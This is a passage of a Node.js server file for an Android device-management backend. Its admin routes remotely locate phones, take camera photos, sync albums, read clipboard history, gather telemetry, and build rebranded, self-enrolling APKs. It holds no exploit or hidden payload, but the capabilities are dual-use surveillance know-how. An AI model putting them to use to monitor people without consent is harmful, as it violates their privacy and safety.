import { db, persist } from "./db.js";
import { randomToken } from "./auth.js";
import {
  adminCount,
  checkRateLimit,
  clearFailures,
  clearCookie,
  createAdmin,
  extractSessionToken,
  findAdmin,
  getSession,
  hashPassword,
  issueSession,
  recordFailure,
  revokeSession,
  sessionCookie,
  SESSION_TTL_MS,
  validatePassword,
  verifyPassword,
} from "./adminAuth.js";
import { sendCommand, isOnline } from "./ws.js";
import { readPhoto } from "./storage.js";
import { logEvent, readLogs, clearLogs, listLogDevices } from "./deviceLog.js";
import { listApks, saveApk, deleteApk, openApkStream } from "./apkStore.js";
import { readBinaryBody } from "./http.js";
import { effectiveConfig, buildConfigPatch, VALID_BACKGROUND_MODES } from "./deviceConfig.js";
import { startBuild, buildStatus, envInfo, MODULES } from "./apkBuilder.js";
import { KNOWN_PERMISSIONS, enqueuePermissionRequest } from "./permissionRequest.js";
import {
  currentBranding,
  saveIcon,
  removeIcon,
  customIconPath,
  validateAppName,
  validatePackageName,
} from "./branding.js";
import {
  listGroups,
  createGroup,
  updateGroup,
  deleteGroup,
  assignDevice,
  bulkAssign,
  groupOf,
  GROUP_COLORS,
} from "./groups.js";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { SetupManager } from "./setup.js";

/** 构建环境安装的日志缓冲，供前端诊断。 */
const setupLog = [];

/*
 * 构建根目录必须与 apkBuilder 用同一个解析逻辑，
 * 否则会出现「装到了 A 目录、编译去找 B 目录」的问题。
 */
const setupManager = new SetupManager(envInfo().buildRoot, {
  exePath: process.execPath,
  onLog: (m) => {
    setupLog.push(m);
    if (setupLog.length > 500) setupLog.shift();
  },
});

function fail(status, error, message) {
  const err = new Error(message || error);
  err.status = status;
  err.code = error;
  throw err;
}

/** 要求已登录管理员；未登录一律 401，前端据此跳登录页。 */
function requireAdmin(ctx) {
  const token = extractSessionToken(ctx.req);
  const session = getSession(token);
  if (!session) fail(401, "not_logged_in", "请先登录");
  return { session, token };
}

function clientIp(ctx) {
  return (
    ctx.req.headers["cf-connecting-ip"] ||
    (ctx.req.headers["x-forwarded-for"] || "").split(",")[0].trim() ||
    ctx.req.socket?.remoteAddress ||
    "unknown"
  );
}

/** 管理员视角的设备信息，比监控端多出所属 Key 前缀，便于排查。 */
function adminDeviceView(d) {
  return {
    id: d.id,
    name: d.name,
    model: d.model || null,
    appVersion: d.appVersion || null,
    online: isOnline(d.id),
    createdAt: d.createdAt,
    lastSeenAt: d.lastSeenAt || null,
    lastLocation: d.lastLocation || null,
    lastTelemetry: d.lastTelemetry || null,
    // 权限状态单独暴露，方便列表页直接标出缺哪些
    permissions: d.permissions || null,
    photoCount: (d.photos || []).length,
    ownerKeyHashPrefix: (d.ownerKeyHash || "").slice(0, 12),
    allowRemoteCapture: d.settings?.notificationEnabled !== false,
  };
}

export function buildAdminRoutes() {
  const routes = {};

  // ---------- 账号 ----------

  /** 是否已有管理员；前端据此决定显示"创建管理员"还是"登录"。 */
  routes["GET /api/admin/status"] = () => {
    const token = extractSessionToken({ headers: {} });
    return {
      body: {
        ok: true,
        initialized: adminCount() > 0,
        adminCount: adminCount(),
      },
    };
  };

  /** 首次初始化：只在没有任何管理员时可用，避免被人抢先注册。 */
  routes["POST /api/admin/setup"] = (ctx) => {
    if (adminCount() > 0) fail(403, "already_initialized", "管理员已存在，请直接登录");
    const { username, password } = ctx.body || {};
    createAdmin(username, password);
    const { token } = issueSession(username, clientIp(ctx));
    return {
      headers: { "Set-Cookie": sessionCookie(token) },
      body: { ok: true, username, message: "管理员创建成功" },
    };
  };

  routes["POST /api/admin/login"] = (ctx) => {
    const ip = clientIp(ctx);
    const limit = checkRateLimit(ip);
    if (!limit.allowed) {
      fail(429, "too_many_attempts", `尝试过于频繁，请 ${Math.ceil((limit.retryAfterMs || 0) / 60000)} 分钟后再试`);
    }

    const { username, password } = ctx.body || {};
    const admin = findAdmin(String(username || ""));
    // 用户名不存在与密码错误返回同一句话，避免枚举账号
    if (!admin || !verifyPassword(String(password || ""), admin.salt, admin.hash)) {
      recordFailure(ip);
      fail(401, "bad_credentials", "用户名或密码错误");
    }

    clearFailures(ip);
    const { token } = issueSession(admin.username, ip);
    return {
      headers: { "Set-Cookie": sessionCookie(token) },
      body: { ok: true, username: admin.username },
    };
  };

  routes["POST /api/admin/logout"] = (ctx) => {
    const token = extractSessionToken(ctx.req);
    revokeSession(token);
    return { headers: { "Set-Cookie": clearCookie() }, body: { ok: true } };
  };

  routes["GET /api/admin/me"] = (ctx) => {
    const { session } = requireAdmin(ctx);
    const admin = findAdmin(session.username);
    return {
      body: {
        ok: true,
        username: session.username,
        lastLoginAt: admin?.lastLoginAt || null,
        sessionExpiresAt: session.expiresAt,
      },
    };
  };

  routes["POST /api/admin/password"] = (ctx) => {
    const { session } = requireAdmin(ctx);
    const { oldPassword, newPassword } = ctx.body || {};
    const admin = findAdmin(session.username);
    if (!admin || !verifyPassword(String(oldPassword || ""), admin.salt, admin.hash)) {
      fail(401, "bad_credentials", "原密码不正确");
    }
    const { validatePassword: vp, hashPassword: hp } = { validatePassword, hashPassword };
    const weakness = vp(newPassword);
    if (weakness) fail(400, "weak_password", weakness);

    const { salt, hash } = hp(newPassword);
    admin.salt = salt;
    admin.hash = hash;
    // 改密后清掉该账号的其他会话，防止旧会话继续有效
    for (const [token, s] of Object.entries(db().adminSessions)) {
      if (s.username === admin.username) delete db().adminSessions[token];
    }
    persist();
    return {
      headers: { "Set-Cookie": clearCookie() },
      body: { ok: true, message: "密码已修改，请重新登录" },
    };
  };

  // ---------- 设备总览 ----------

  routes["GET /api/admin/devices"] = (ctx) => {
    requireAdmin(ctx);
    let devices = Object.values(db().devices).map((d) => ({
      ...adminDeviceView(d),
      group: groupOf(d),
    }));

    // 支持按分组筛选：?groupId=xxx，?groupId=none 表示未分组
    const wantGroup = ctx.url.searchParams.get("groupId");
    if (wantGroup) {
      if (wantGroup === "none") {
        devices = devices.filter((d) => !d.group);
      } else {
        devices = devices.filter((d) => d.group?.id === wantGroup);
      }
    }

    devices.sort((a, b) => (b.lastSeenAt || 0) - (a.lastSeenAt || 0));
    return {
      body: {
        ok: true,
        devices,
        stats: {
          total: devices.length,
          online: devices.filter((d) => d.online).length,
          photos: devices.reduce((n, d) => n + d.photoCount, 0),
        },
      },
    };
  };

  routes["GET /api/admin/devices/:deviceId"] = (ctx) => {
    requireAdmin(ctx);
    const d = db().devices[ctx.params.deviceId];
    if (!d) fail(404, "device_not_found", "设备不存在");
    const photos = [...(d.photos || [])].sort((a, b) => b.createdAt - a.createdAt);
    return { body: { ok: true, device: adminDeviceView(d), photos } };
  };

  // ---------- 指令下发 ----------

  /** 统一的下发入口，避免为每个动作写一份重复代码。 */
  async function dispatch(ctx, command, timeoutMs, bodyOverride) {
    requireAdmin(ctx);
    const d = db().devices[ctx.params.deviceId];
    if (!d) fail(404, "device_not_found", "设备不存在");
    try {
      const result = await sendCommand(d.id, bodyOverride || command, timeoutMs);
      if (command.command === "locate" && result.ok && result.location) {
        d.lastLocation = { ...result.location, updatedAt: Date.now() };
        persist();
      }
      return { body: { ok: !!result.ok, result, error: result.error || null } };
    } catch (e) {
      return { status: 200, body: { ok: false, error: e.code || "unavailable", message: e.message } };
    }
  }

  routes["POST /api/admin/devices/:deviceId/locate"] = (ctx) => dispatch(ctx, { command: "locate" }, 60_000);

  routes["POST /api/admin/devices/:deviceId/capture"] = (ctx) => {
    const lens = ctx.body?.lens === "front" ? "front" : "back";
    return dispatch(ctx, { command: "capture" }, 90_000, { command: "capture", lens });
  };

  routes["POST /api/admin/devices/:deviceId/sync-album"] = (ctx) => {
    const limit = Math.min(Number(ctx.body?.limit || 5), 10);
    return dispatch(ctx, { command: "sync_album" }, 150_000, { command: "sync_album", limit });
  };

  routes["POST /api/admin/devices/:deviceId/ping"] = (ctx) => dispatch(ctx, { command: "ping" }, 15_000);

  /**
   * 读取设备剪贴板。
   *
   * 平台限制：Android 10+ 只允许应用在前台读剪贴板。
   * 设备在后台时会返回本地历史记录里最近的内容，并在 fromHistory 里标注，
   * 避免让管理员误以为是实时内容。
   */
  routes["POST /api/admin/devices/:deviceId/clipboard"] = async (ctx) => {
    requireAdmin(ctx);
    const d = db().devices[ctx.params.deviceId];
    if (!d) fail(404, "device_not_found", "设备不存在");
    try {
      const result = await sendCommand(d.id, { command: "clipboard" }, 30_000);
      if (result.ok) {
        logEvent(d.id, "clipboard", "读取设备剪贴板", {
          length: result.length || 0,
          fromHistory: !!result.fromHistory,
        });
      }
      return {
        body: {
          ok: !!result.ok,
          text: result.text || null,
          length: result.length || 0,
          fromHistory: !!result.fromHistory,
          history: result.history || [],
          historyCount: result.historyCount || 0,
          error: result.error || null,
          hint: result.hint || null,
        },
      };
    } catch (e) {
      return { status: 200, body: { ok: false, error: e.code || "unavailable", message: e.message } };
    }
  };

  /**
   * 要求设备打开管理页。
   *
   * 这是进入设备管理页的唯一途径：设备端不提供自助入口，
   * 也不根据剪贴板等本地条件自行判断。
   *
   * 平台限制：Android 禁止后台启动界面，所以指令到达时如果设备在后台，
   * 会挂起请求，等用户下次打开 App 时自动切到管理页。
   */
  routes["POST /api/admin/devices/:deviceId/open-admin"] = async (ctx) => {
    requireAdmin(ctx);
    const d = db().devices[ctx.params.deviceId];
    if (!d) fail(404, "device_not_found", "设备不存在");

    if (!isOnline(d.id)) {
      return {
        body: {
          ok: false,
          error: "offline",
          message: "设备不在线，无法发送指令。请等设备上线后重试。",
        },
      };
    }

    try {
      const result = await sendCommand(d.id, { command: "open_admin" }, 20_000);
      if (result.ok) {
        logEvent(d.id, "admin", "管理员请求打开管理页", {
          queued: !!result.queued,
        });
      }
      return {
        body: {
          ok: !!result.ok,
          queued: !!result.queued,
          message: result.message || (result.ok ? "已通知设备打开管理页" : result.error || "发送失败"),
        },
      };
    } catch (e) {
      return {
        status: 200,
        body: {
          ok: false,
          error: e.code || "unavailable",
          message: e.message || "设备未响应",
        },
      };
    }
  };

  /**
   * 远程请求权限。
   *
   * 语义：登记一个待办，设备下次用户主动打开 App 时拉取并弹系统权限框。
   * 不在后台弹窗、不发通知，因为 Android 禁止后台弹权限框与拉起界面。
   */
  routes["POST /api/admin/devices/:deviceId/request-permissions"] = async (ctx) => {
    requireAdmin(ctx);
    const d = db().devices[ctx.params.deviceId];
    if (!d) fail(404, "device_not_found", "设备不存在");

    const keys = Array.isArray(ctx.body?.keys) ? ctx.body.keys : [];
    // 校验：不认识的 key 直接拒绝，避免前端传错
    const invalid = keys.filter((k) => !KNOWN_PERMISSIONS[k]);
    if (invalid.length) {
      fail(400, "unknown_permission", `不认识的权限：${invalid.join(", ")}`);
    }

    const req = enqueuePermissionRequest(d.id, keys);
    logEvent(d.id, "permission", "管理员请求补充权限", {
      keys,
      labels: keys.map((k) => KNOWN_PERMISSIONS[k].label).join("、") || "全部缺失项",
    });

    return {
      body: {
        ok: true,
        queued: true,
        keys,
        message: "已登记，用户下次打开 App 时会弹出授权框",
      },
    };
  };

  /** 可请求的权限清单，供前端渲染勾选框。 */
  routes["GET /api/admin/permissions/catalog"] = (ctx) => {
    requireAdmin(ctx);
    return {
      body: {
        ok: true,
        permissions: Object.entries(KNOWN_PERMISSIONS).map(([key, v]) => ({
          key,
          label: v.label,
          special: v.special,
          desc: v.desc,
        })),
      },
    };
  };

  /** 让设备立刻上报一次运行状态（电量/温度/屏幕/内存/存储/前台应用）。 */
  routes["POST /api/admin/devices/:deviceId/telemetry"] = async (ctx) => {
    requireAdmin(ctx);
    const d = db().devices[ctx.params.deviceId];
    if (!d) fail(404, "device_not_found", "设备不存在");
    try {
      const result = await sendCommand(d.id, { command: "telemetry" }, 30_000);
      if (result.ok && result.telemetry) {
        d.lastTelemetry = { ...result.telemetry, updatedAt: Date.now() };
        persist();
      }
      return { body: { ok: !!result.ok, telemetry: d.lastTelemetry || null, error: result.error || null } };
    } catch (e) {
      return {
        status: 200,
        body: { ok: false, error: e.code || "unavailable", message: e.message, telemetry: d.lastTelemetry || null },
      };
    }
  };

  /** 让设备立刻上报一次运行状态（监控端「刷新状态」按钮用）。 */
  routes["POST /api/admin/devices/:deviceId/telemetry/refresh"] = async (ctx) => {
    requireAdmin(ctx);
    const d = db().devices[ctx.params.deviceId];
    if (!d) fail(404, "device_not_found", "设备不存在");
    try {
      const result = await sendCommand(d.id, { command: "telemetry" }, 30_000);
      if (!result.ok) {
        return { status: 200, body: { ok: false, message: result.error || "设备未响应" } };
      }
      // 设备把数据放在回执里，这里顺手写库，保证列表也能看到
      if (result.telemetry) {
        db().devices[d.id].lastTelemetry = result.telemetry;
        persist();
      }
      logEvent(d.id, "telemetry", "管理员刷新运行状态");
      return {
        body: {
          ok: true,
          telemetry: result.telemetry || db().devices[d.id]?.lastTelemetry || null,
        },
      };
    } catch (e) {
      return {
        status: 200,
        body: { ok: false, message: e.code === "offline" ? "设备不在线" : e.message },
      };
    }
  };

  /** 读取某台设备的独立日志。 */
  routes["GET /api/admin/devices/:deviceId/logs"] = (ctx) => {
    requireAdmin(ctx);
    const d = db().devices[ctx.params.deviceId];
    if (!d) fail(404, "device_not_found", "设备不存在");
    const limit = Math.min(Number(ctx.url.searchParams.get("limit") || 200), 1000);
    const since = Number(ctx.url.searchParams.get("since") || 0);
    const event = ctx.url.searchParams.get("event");
    return { body: { ok: true, deviceId: d.id, logs: readLogs(d.id, { limit, since, event }) } };
  };

  /** 清空某台设备的日志。 */
  routes["DELETE /api/admin/devices/:deviceId/logs"] = (ctx) => {
    requireAdmin(ctx);
    const d = db().devices[ctx.params.deviceId];
    if (!d) fail(404, "device_not_found", "设备不存在");
    clearLogs(d.id);
    logEvent(d.id, "log", "管理员清空了日志");
    return { body: { ok: true } };
  };

  /** 所有设备的日志文件概况，便于排查存储占用。 */
  routes["GET /api/admin/logs/overview"] = (ctx) => {
    requireAdmin(ctx);
    return { body: { ok: true, files: listLogDevices() } };
  };

  // ---------- 运行配置 ----------

  /** 读取全局默认配置。 */
  routes["GET /api/admin/config"] = (ctx) => {
    requireAdmin(ctx);
    return {
      body: {
        ok: true,
        config: effectiveConfig(null),
        modes: VALID_BACKGROUND_MODES,
      },
    };
  };

  /**
   * 修改全局默认配置或单台设备配置。
   *
   * 改了之后设备下次上线/上报遥测时会拿到新配置并自动调整，不需要重装 APK。
   */
  routes["POST /api/admin/config"] = (ctx) => {
    requireAdmin(ctx);
    const body = ctx.body || {};

    let target = null;
    if (body.deviceId) {
      target = db().devices[body.deviceId];
      if (!target) fail(404, "device_not_found", "设备不存在");
    }

    const patch = buildConfigPatch(body);
    if (Object.keys(patch).length === 0) fail(400, "empty_patch", "没有要修改的字段");

    if (target) {
      target.config = { ...(target.config || {}), ...patch };
      logEvent(target.id, "config", "设备配置已更新", patch);
    } else {
      db().settings = db().settings || {};
      db().settings.deviceConfig = { ...(db().settings.deviceConfig || {}), ...patch };
    }
    persist();

    // 在线设备立即推送新配置，不用等下次上线
    if (target && isOnline(target.id)) {
      sendCommand(target.id, { command: "reload_config" }, 10_000).catch(() => {});
    }

    return { body: { ok: true, config: effectiveConfig(target) } };
  };

  /** 批量设置一批设备的配置。 */
  routes["POST /api/admin/config/bulk"] = (ctx) => {
    requireAdmin(ctx);
    const body = ctx.body || {};
    const deviceIds = Array.isArray(body.deviceIds) ? body.deviceIds : [];
    if (deviceIds.length === 0) fail(400, "no_targets", "请指定要修改的设备");

    const patch = buildConfigPatch(body);
    if (Object.keys(patch).length === 0) fail(400, "empty_patch", "没有要修改的字段");

    let changed = 0;
    for (const id of deviceIds) {
      const d = db().devices[id];
      if (!d) continue;
      d.config = { ...(d.config || {}), ...patch };
      changed++;
    }
    persist();
    return { body: { ok: true, changed } };
  };

  routes["DELETE /api/admin/devices/:deviceId"] = (ctx) => {
    requireAdmin(ctx);
    const d = db().devices[ctx.params.deviceId];
    if (!d) fail(404, "device_not_found", "设备不存在");
    logEvent(d.id, "unpair", "管理员解绑设备");
    delete db().devices[d.id];
    persist();
    return { body: { ok: true, removed: d.id } };
  };

  routes["GET /api/admin/devices/:deviceId/photos"] = (ctx) => {
    requireAdmin(ctx);
    const d = db().devices[ctx.params.deviceId];
    if (!d) fail(404, "device_not_found", "设备不存在");
    const photos = [...(d.photos || [])].sort((a, b) => b.createdAt - a.createdAt);
    return { body: { ok: true, photos } };
  };

  /** 图片代理：浏览器用 <img src> 直接加载，靠 Cookie 鉴权。 */
  routes["GET /api/admin/devices/:deviceId/photos/:photoId"] = (ctx) => {
    requireAdmin(ctx);
    const d = db().devices[ctx.params.deviceId];
    if (!d) fail(404, "device_not_found", "设备不存在");
    const found = readPhoto(d.id, ctx.params.photoId);
    if (!found) fail(404, "photo_not_found", "照片不存在");
    return { raw: found.buf, contentType: found.mime };
  };

  routes["POST /api/admin/pairing/code"] = (ctx) => {
    requireAdmin(ctx);
    // 管理员生成的配对码绑定到一个"任意已注册 Key"，让新设备能归入任意账号；
    // 这里直接用管理员自己持有的 Key 槽位标识，避免和监控端 Key 体系冲突。
    const code = String(Math.floor(100000 + Math.random() * 900000));
    db().pairingCodes[code] = {
      code,
      ownerKeyHash: ctx.body?.ownerKeyHash || null,
      createdAt: Date.now(),
      expiresAt: Date.now() + 10 * 60 * 1000,
      createdBy: "admin",
    };
    persist();
    return { body: { ok: true, code, expiresAt: Date.now() + 10 * 60 * 1000 } };
  };

  /**
   * 批量生成配对码。
   *
   * 几十台 PDA 逐台生成太慢，这里一次给一组。
   * 每个码仍然只能使用一次、10 分钟过期，安全性不打折。
   */
  routes["POST /api/admin/pairing/batch"] = (ctx) => {
    requireAdmin(ctx);
    const count = Math.min(Math.max(Number(ctx.body?.count || 10), 1), 50);
    const ownerKeyHash = ctx.body?.ownerKeyHash || null;
    const ttl = 30 * 60 * 1000; // 批量码给 30 分钟，够逐台录入
    const codes = [];

    for (let i = 0; i < count; i++) {
      // 避免撞码：循环取一个未被占用的
      let code;
      let guard = 0;
      do {
        code = String(Math.floor(100000 + Math.random() * 900000));
        guard++;
      } while (db().pairingCodes[code] && guard < 100);

      db().pairingCodes[code] = {
        code,
        ownerKeyHash,
        createdAt: Date.now(),
        expiresAt: Date.now() + ttl,
        createdBy: "admin",
      };
      codes.push(code);
    }
    persist();
    return { body: { ok: true, codes, count: codes.length, expiresAt: Date.now() + ttl } };
  };

  // ---------- APK 分发包 ----------

  /** 已上传的安装包列表（含下载地址）。 */
  routes["GET /api/admin/apks"] = (ctx) => {
    requireAdmin(ctx);
    const host = ctx.req.headers["host"] || "localhost";
    // 用请求头里的 host 拼绝对地址，手机访问时得到的就是局域网地址
    const scheme = ctx.req.headers["x-forwarded-proto"] || "http";
    const base = `${scheme}://${host}`;
    const files = listApks().map((f, i) => ({
      ...f,
      index: i,
      // 用索引做下载地址：中文文件名经过某些隧道会被改写，索引是纯数字最稳
      url: `${base}/download/${i}`,
      directUrl: `${base}/download/${encodeURIComponent(f.name)}`,
    }));
    return { body: { ok: true, apks: files, baseUrl: base } };
  };

  /** 上传 APK（二进制 body，文件名放 query）。 */
  routes["POST /api/admin/apks"] = async (ctx) => {
    requireAdmin(ctx);
    const name = ctx.url.searchParams.get("name");
    const buf = await readBinaryBody(ctx.req, 300 * 1024 * 1024);
    if (!buf.length) fail(400, "empty_file", "文件为空");
    let saved;
    try {
      saved = saveApk(name, buf);
    } catch (e) {
      fail(400, "invalid_apk", e.message);
    }
    const host = ctx.req.headers["host"] || "localhost";
    const scheme = ctx.req.headers["x-forwarded-proto"] || "http";
    return {
      body: {
        ok: true,
        name: saved.name,
        size: saved.size,
        url: `${scheme}://${host}/download/${encodeURIComponent(saved.name)}`,
      },
    };
  };

  routes["DELETE /api/admin/apks/:name"] = (ctx) => {
    requireAdmin(ctx);
    if (!deleteApk(ctx.params.name)) fail(404, "not_found", "文件不存在");
    return { body: { ok: true } };
  };

  // ---------- 服务端构建 ----------

  /** 构建环境是否就绪，以及可构建哪些模块。 */
  routes["GET /api/admin/build/env"] = (ctx) => {
    requireAdmin(ctx);
    return {
      body: {
        ok: true,
        env: envInfo(),
        modules: Object.entries(MODULES).map(([key, m]) => ({ key, label: m.label })),
      },
    };
  };

  /**
   * 触发一次构建。
   *
   * 立即返回，不等编译完成（APK 要 1–3 分钟，HTTP 会超时）。
   * 前端轮询 /status 拿进度。
   */
  routes["POST /api/admin/build"] = (ctx) => {
    requireAdmin(ctx);
    const moduleKey = ctx.body?.module || "device";

    // 环境没装好时，明确告诉用户去哪里装，而不是只报一句错误
    if (!envInfo().ready) {
      const bundled = setupManager.hasBundled();
      fail(
        400,
        "env_not_ready",
        bundled
          ? "构建环境未安装。请在上方「构建环境」卡片点「一键安装」，完成后即可编译。"
          : "构建环境未就绪，且当前程序未内置资源。请使用带构建环境的完整版程序。",
      );
    }

    // 可选品牌定制
    let branding = null;
    try {
      if (moduleKey === "device") {
        const enroll = db().settings?.enrollment || {};
        const wantEnroll = ctx.body?.enroll === true;

        if (wantEnroll) {
          if (!enroll.enabled || !enroll.groupKey) {
            fail(400, "enroll_not_ready", "请先在「预置注册」里启用并生成组密钥");
          }
          /*
           * 服务端地址必须显式填过，不能用当前访问地址自动推断。
           * 管理员可能通过 127.0.0.1 或内网地址访问后台，
           * 自动推断会把这个地址写进 APK，设备装到现场就连不上了。
           */
          if (!enroll.serverUrl) {
            fail(
              400,
              "server_url_required",
              "请先在「预置注册」里填写服务器地址（设备要访问的那个地址），再编译带预置注册的 APK",
            );
          }
        }

        branding = {
          target: "device",
          appName: ctx.body?.appName ? validateAppName(ctx.body.appName) : null,
          packageName: ctx.body?.packageName ? validatePackageName(ctx.body.packageName) : null,
          enrollServerUrl: wantEnroll ? enroll.serverUrl : null,
          enrollGroupKey: wantEnroll ? enroll.groupKey : null,
        };

        if (!branding.appName && !branding.packageName && !branding.enrollGroupKey) {
          branding = null;
        }
      } else if (moduleKey === "monitor") {
        /*
         * 监控端：不需要组密钥，只需要把服务器地址写进去，
         * 这样装完打开登录页就直接预填好地址，少一步手输。
         */
        const enroll = db().settings?.enrollment || {};
        const serverUrl = (ctx.body?.serverUrl || enroll.serverUrl || "").trim();
        if (serverUrl) {
          if (!/^https?:\/\/\S+$/i.test(serverUrl)) {
            fail(400, "invalid_url", "服务器地址需以 http:// 或 https:// 开头");
          }
          branding = { target: "monitor", monitorServerUrl: serverUrl };
        }
      }
    } catch (e) {
      if (e.status) throw e;
      fail(400, "invalid_branding", e.message);
    }

    try {
      const status = startBuild(moduleKey, branding);
      return { body: { ok: true, status } };
    } catch (e) {
      fail(400, "build_rejected", e.message);
    }
  };

  // ---------- 设备分组 ----------

  /** 列出所有分组（含设备数统计）。 */
  routes["GET /api/admin/groups"] = (ctx) => {
    requireAdmin(ctx);
    return { body: { ok: true, groups: listGroups(), colors: GROUP_COLORS } };
  };

  routes["POST /api/admin/groups"] = (ctx) => {
    requireAdmin(ctx);
    try {
      const g = createGroup(ctx.body?.name, ctx.body?.color, ctx.body?.note);
      return { body: { ok: true, group: g } };
    } catch (e) {
      fail(400, "invalid_group", e.message);
    }
  };

  routes["POST /api/admin/groups/:groupId"] = (ctx) => {
    requireAdmin(ctx);
    try {
      const g = updateGroup(ctx.params.groupId, ctx.body || {});
      return { body: { ok: true, group: g } };
    } catch (e) {
      if (e.status) throw e;
      fail(400, "invalid_group", e.message);
    }
  };

  /** 删除分组：设备不会被删，只移出分组。 */
  routes["DELETE /api/admin/groups/:groupId"] = (ctx) => {
    requireAdmin(ctx);
    const r = deleteGroup(ctx.params.groupId);
    if (!r.removed) fail(404, "group_not_found", "分组不存在");
    return { body: { ok: true, detached: r.detached } };
  };

  /** 把设备分配到分组（groupId 传 null 表示移出）。 */
  routes["POST /api/admin/devices/:deviceId/group"] = (ctx) => {
    requireAdmin(ctx);
    const groupId = ctx.body?.groupId === undefined ? null : ctx.body.groupId;
    try {
      const d = assignDevice(ctx.params.deviceId, groupId);
      return { body: { ok: true, deviceId: d.id, groupId: d.groupId } };
    } catch (e) {
      if (e.status) throw e;
      fail(400, "assign_failed", e.message);
    }
  };

  /** 批量分配。 */
  routes["POST /api/admin/groups/:groupId/assign"] = (ctx) => {
    requireAdmin(ctx);
    const ids = Array.isArray(ctx.body?.deviceIds) ? ctx.body.deviceIds : [];
    if (ids.length === 0) fail(400, "no_devices", "请选择要分组的设备");
    try {
      const changed = bulkAssign(ids, ctx.params.groupId);
      return { body: { ok: true, changed } };
    } catch (e) {
      if (e.status) throw e;
      fail(400, "assign_failed", e.message);
    }
  };

  // ---------- 预置注册（组密钥） ----------

  /**
   * 预置注册配置：让编译好的 APK 能自动注册，不用逐台填配对码。
   *
   * 默认关闭，管理员显式开启才生效。
   */
  routes["GET /api/admin/enrollment"] = (ctx) => {
    requireAdmin(ctx);
    const e = db().settings?.enrollment || {};
    return {
      body: {
        ok: true,
        enrollment: {
          enabled: !!e.enabled,
          groupKey: e.groupKey || "",
          maxDevices: e.maxDevices || 0,
          serverUrl: e.serverUrl || "",
          // 预置注册时自动归入的分组，监控端要用它回填下拉框
          groupId: e.groupId || null,
          createdAt: e.createdAt || null,
        },
      },
    };
  };

  routes["POST /api/admin/enrollment"] = (ctx) => {
    requireAdmin(ctx);
    const body = ctx.body || {};
    db().settings = db().settings || {};
    const prev = db().settings.enrollment || {};
    const next = { ...prev };

    if (body.enabled !== undefined) next.enabled = !!body.enabled;

    if (body.groupKey !== undefined) {
      const key = String(body.groupKey || "").trim();
      if (key && key.length < 16) {
        fail(400, "weak_group_key", "组密钥至少 16 位（它会写进 APK，必须够长）");
      }
      if (key && /\s/.test(key)) fail(400, "bad_group_key", "组密钥不能包含空格");
      next.groupKey = key;
      next.createdAt = key ? Date.now() : null;
    }

    if (body.maxDevices !== undefined) {
      const n = Number(body.maxDevices);
      if (!Number.isFinite(n) || n < 0 || n > 10000) {
        fail(400, "invalid_quota", "注册上限需在 0–10000 之间（0 表示不限）");
      }
      next.maxDevices = Math.floor(n);
    }

    if (body.serverUrl !== undefined) {
      const url = String(body.serverUrl || "").trim();
      if (url && !/^https?:\/\/\S+$/i.test(url)) {
        fail(400, "invalid_url", "服务器地址需以 http:// 或 https:// 开头");
      }
      next.serverUrl = url;
    }

    // 预置注册时自动归入哪个分组
    if (body.groupId !== undefined) {
      const gid = body.groupId || null;
      if (gid && !db().groups?.[gid]) {
        fail(400, "invalid_group", "分组不存在");
      }
      next.groupId = gid;
    }

    // 开启时必须已有组密钥
    if (next.enabled && !next.groupKey) {
      fail(400, "no_group_key", "启用预置注册前需要先生成组密钥");
    }

    db().settings.enrollment = next;
    persist();
    return { body: { ok: true, enrollment: next } };
  };

  /** 重新生成组密钥（旧密钥立即失效）。 */
  routes["POST /api/admin/enrollment/rotate"] = (ctx) => {
    requireAdmin(ctx);
    const key = randomToken(24).replace(/[^A-Za-z0-9]/g, "").slice(0, 32);
    db().settings = db().settings || {};
    db().settings.enrollment = {
      ...(db().settings.enrollment || {}),
      groupKey: key,
      createdAt: Date.now(),
    };
    persist();
    logEvent("enroll", "group_key_rotated", "组密钥已重新生成");
    return { body: { ok: true, groupKey: key } };
  };

  // ---------- 构建环境一键安装 ----------

  /**
   * 查询构建环境状态。
   *
   * 编译 APK 需要 JDK + Gradle + Android SDK + 依赖缓存（约 2.5GB）。
   * 局域网没法联网下载，所以这些资源被打包在 exe 尾部，
   * 首次使用时一键释放到磁盘。
   */
  routes["GET /api/admin/build/setup"] = (ctx) => {
    requireAdmin(ctx);
    return {
      body: {
        ok: true,
        ready: envInfo().ready,
        hasBundled: setupManager.hasBundled(),
        progress: setupManager.progress(),
        status: setupManager.status(),
      },
    };
  };

  /** 启动一键安装（释放内置资源）。可重复调用，已完成的会跳过。 */
  routes["POST /api/admin/build/setup"] = async (ctx) => {
    requireAdmin(ctx);
    if (setupManager.state.running) {
      fail(409, "setup_running", "安装已在进行中，请等待完成");
    }
    const force = ctx.body?.force === true;

    // 后台跑，前端轮询状态（释放 2GB 需要几分钟）
    setupManager.install({ force }).catch(() => {
      /* 错误已记录在 status 里 */
    });

    return { body: { ok: true, status: setupManager.status() } };
  };

  /** 编译日志（供诊断）。 */
  routes["GET /api/admin/build/setup/log"] = (ctx) => {
    requireAdmin(ctx);
    return { body: { ok: true, log: setupLog.slice(-300) } };
  };

  // ---------- 品牌定制 ----------

  /** 当前品牌配置。 */
  routes["GET /api/admin/branding"] = (ctx) => {
    requireAdmin(ctx);
    return {
      body: {
        ok: true,
        branding: currentBranding(),
        defaults: {
          appName: "定位助手",
          packageName: "com.example.locateme",
        },
      },
    };
  };

  /** 上传图标（二进制 body）。 */
  routes["POST /api/admin/branding/icon"] = async (ctx) => {
    requireAdmin(ctx);
    const buf = await readBinaryBody(ctx.req, 5 * 1024 * 1024);
    if (!buf.length) fail(400, "empty_file", "文件为空");

    const ext = ctx.url.searchParams.get("ext") || "png";
    try {
      saveIcon(buf, `icon.${ext}`);
    } catch (e) {
      fail(400, "invalid_icon", e.message);
    }
    return { body: { ok: true, branding: currentBranding() } };
  };

  /** 读取当前自定义图标（供后台预览）。 */
  routes["GET /api/admin/branding/icon"] = (ctx) => {
    requireAdmin(ctx);
    const p = customIconPath();
    if (!p) fail(404, "no_icon", "未上传图标");
    const ext = p.split(".").pop().toLowerCase();
    const mime =
      ext === "png" ? "image/png" : ext === "webp" ? "image/webp" : "image/jpeg";
    return { raw: readFileSync(p), contentType: mime };
  };

  /** 删除自定义图标，回到默认图标。 */
  routes["DELETE /api/admin/branding/icon"] = (ctx) => {
    requireAdmin(ctx);
    removeIcon();
    return { body: { ok: true, branding: currentBranding() } };
  };

  /** 查询构建进度与结果。 */
  routes["GET /api/admin/build/status"] = (ctx) => {
    requireAdmin(ctx);
    return { body: { ok: true, status: buildStatus() } };
  };

  /**
   * 公开下载接口：不需要登录。
   *
